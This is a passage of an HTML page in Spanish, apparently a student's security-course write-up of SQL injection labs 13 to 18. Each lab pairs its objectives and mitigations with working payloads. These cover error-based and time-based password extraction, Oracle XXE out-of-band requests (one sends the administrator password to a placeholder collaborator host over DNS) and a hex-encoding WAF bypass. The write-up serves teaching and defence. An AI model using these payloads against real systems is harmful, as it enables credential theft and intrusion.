+                            <div class="terminal-body"><span class="prompt">Cookie ></span> <span class="command">'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1) ELSE TO_CHAR(1/0) END FROM dual)||'</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_13] Visible Error-Based SQL Injection
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Error-based (Visible)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Aprovechar mensajes de error "verborreicos" o demasiado detallados en la respuesta HTTP para obligar al servidor a imprimir credenciales directamente en pantalla.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La configuración de desarrollo de la base de datos se dejó en producción. El servidor web entrega al usuario el stack trace completo del motor SQL.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Encontrar parámetro susceptible en la Cookie TrackingId.<br>
+                            2. Forzar un error de sintaxis usando la función de conversión `CAST` (De texto a Entero).<br>
+                            3. El sistema colapsa intentando convertir la contraseña a Número, e imprime el dato sensible en el error en pantalla.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>CAST((SELECT password...) AS int):</strong> Intenta deliberadamente generar incompatibilidad de tipos para usar el buffer de errores como canal de exfiltración.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Deshabilitar imperativamente mensajes de error detallados en ambientes productivos (Error suppression).</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Cookie ></span> <span class="command">' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_14] Blind SQL injection with time delays
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Blind / Time-based</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Demostrar que una web 100% blind (sin errores, sin cambios booleanos) aún puede ser atacada forzando retrasos intencionales en el servidor.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> Las peticiones backend se procesan síncronamente. Si un comando de DB tarda, la respuesta HTTP se congela.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Concatenar la orden de espera propia del motor PostgreSQL: `pg_sleep(10)`.<br>
+                            2. El servidor entra en suspensión y devuelve la respuesta HTTP exactamente 10 segundos después. Esto confirma absolutamente la inyección.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>'||:</strong> Se concatena la función de tiempo. <br>
+                            - <strong>pg_sleep(10):</strong> Función interna de Postgre que detiene el hilo de ejecución de la DB.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Configurar Timeouts cortos a nivel base de datos para prevenir DoS y exfiltración lateral.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Cookie ></span> <span class="command">sY4BQStIt0ljZVUp'||pg_sleep(10)--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_15] Time-based + Data Extraction
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Time-based Data Extraction</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Extraer el password completo utilizando el tiempo de retraso como única señal baliza (Side-channel) para confirmar caracteres.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> Combinación de condicionales booleanos amarrados a funciones síncronas de tiempo.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Inyectar `CASE WHEN (letra adivinada = real) THEN pg_sleep(10) ELSE pg_sleep(0)`.<br>
+                            2. Configurar Burp Intruder en 1 hilo de ejecución.<br>
+                            3. Observar la columna de 'Response Time' en milisegundos. El payload con ~10,000ms revela el carácter correcto.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> Transforma una técnica pasiva (Time delay) en un ataque activo de extracción mediante fuerza bruta condicional lenta.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Además de prepared statements, implementar WAF que bloquee patrones de `pg_sleep`, `WAITFOR DELAY` o `SLEEP()`.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Cookie ></span> <span class="command">x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_16] Blind SQLi Out-of-Band (OAST)
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">Blind / OAST (XXE)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Confirmar una inyección en un sistema ciego y asíncrono, forzando una petición DNS hacia un servidor externo (Burp Collaborator).</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La base de datos (Oracle) tiene habilitado el motor de procesamiento XML. Se explota con una inyección de Entidad Externa (XXE).</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Inyectar carga XML definiendo un dominio de Burp Collaborator.<br>
+                            2. El servidor interpreta el XML, encuentra la entidad HTTP y trata de resolver el dominio de internet.<br>
+                            3. Revisar los logs en Burp Collaborator para ver el "ping" de llegada.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>EXTRACTVALUE(xmltype(...)):</strong> Función obligando al motor a parsear XML.<br>
+                            - <strong>&lt;!ENTITY % remote SYSTEM "http://..."&gt;:</strong> La orden que lanza la petición a la red pública (OAST).</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Egress Filtering estricto (bloquear resolución DNS no autorizada desde la DB) y deshabilitar módulos XML si no se usan.</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Payload ></span> <span class="command">x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLAB/"&gt; %remote;]&gt;'),'/l')+FROM+dual--</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_17] OAST Data Exfiltration
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">OAST Data Exfiltration</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Evolucionar OAST para robar el password e incrustarlo en la petición DNS en forma de subdominio visible al atacante.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La misma capacidad OAST de concatenar valores de bases de datos internamente para enviarlos hacia afuera en texto plano por el puerto 53.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Inyectar una sub-query anidada en la URL de la Entidad XML.<br>
+                            2. El servidor resuelve, por ejemplo: `http://mypassword123.burp-collab.net`.<br>
+                            3. El atacante va al panel DNS y recobra la contraseña directamente desde el dominio resuelto.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - <strong>' ||(SELECT password...)|| '.BURP:</strong> El operador de concatenación arma dinámicamente el FQDN (Fully Qualified Domain Name) infectado con el secreto.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Aislar completamente el servidor de bases de datos impidiendo que resuelva dominios web no autorizados hacia internet (Firewalling backend).</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">Payload ></span> <span class="command">...SYSTEM "http://' ||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLAB/"...</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <button class="accordion-btn" onclick="toggleAccordion(this)">
+                        [LAB_18] WAF Bypass via XML Encoding
+                        <i class="fas fa-terminal"></i>
+                    </button>
+                    <div class="accordion-content">
+                        <div class="lab-info">
+                            <div class="tech-dashboard" style="margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px dashed #444;">
+                                <div class="tech-stat"><span class="label">NIVEL</span><span class="value">Practitioner</span></div>
+                                <div class="tech-stat"><span class="label">TIPO DE SQLi</span><span class="value">UNION-based (WAF Bypass)</span></div>
+                            </div>
+                            <p>> <strong style="color: var(--nixie-glow);">Objetivos:</strong> Evadir el Firewall de Aplicaciones Web (WAF) que bloquea firmas comunes de inyección como "UNION SELECT", ofuscando la carga útil.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Vulnerabilidad:</strong> La característica 'stock check' transmite datos en XML. El analizador XML del backend decodifica entidades Hexadecimales ANTES de enviarlas al motor SQL, pero el WAF las evalúa tal como llegan.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Procedimiento:</strong> <br>
+                            1. Interceptar POST XML. <br>
+                            2. Usar la extensión Hackvertor en Burp Suite para envolver el string de ataque en tags `<@hex_entities>`.<br>
+                            3. El WAF no identifica las entidades raras y permite el paso. El parser backend decodifica las entidades a SQL válido y ejecuta la inyección robando los hashes.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Explicación del payload:</strong> <br>
+                            - El tag engaña al WAF con ofuscación en Hex. El motor ensambla el UNION extrayendo el username y password por la tubería permitida.</p>
+                            <p>> <strong style="color: var(--nixie-glow);">Mitigación recomendada:</strong> Reforzar el WAF para normalizar y decodificar XML antes del análisis de firmas (Deep packet inspection).</p>
+                        </div>
+                        <div class="terminal-code-box">
+                            <div class="terminal-header"><div class="terminal-dots"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span></div><span style="margin-left: 10px;">Payload Executed</span></div>
+                            <div class="terminal-body"><span class="prompt">XML Input ></span> <span class="command">&lt;storeId&gt;&lt;@hex_entities&gt;1 UNION SELECT username || '~' || password FROM users&lt;/@hex_entities&gt;&lt;/storeId&gt;</span></div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+            
+            <div class="content-box" style="margin-top: 25px; border-color: var(--terminal-green);">
+                <h3 style="color: var(--terminal-green);">// CONCLUSIÓN_DEL_MODULO</h3>
+                <p style="font-size: 0.95rem; line-height: 1.5; color: #ccc;">La actividad "Road to Hall of Fame" demostró el impacto crítico de la falta de validación en los inputs (SQLi). A través del uso de herramientas como Burp Suite, se probaron escenarios desde inyecciones lógicas simples (Bypass) hasta exfiltración de datos mediante canales laterales asíncronos (Tiempos) y fuera de banda (DNS). Se concluye categóricamente que la mitigación principal y definitiva para todas estas variantes radica en el uso estricto de <strong>Consultas Parametrizadas (Prepared Statements)</strong>.</p>
+            </div>
+            
+        </section>
+
+        <footer>
+            <div class="footer-content">
+                <p class="copyright">
+                    © 2026 [Hououin] | CNO V SEGURIDAD INFORMÁTICA
+                </p>
+            </div>
+        </footer>
+
+    </div>
+    
+    <script src="script2.js"></script>
+    
+</body>
+</html>
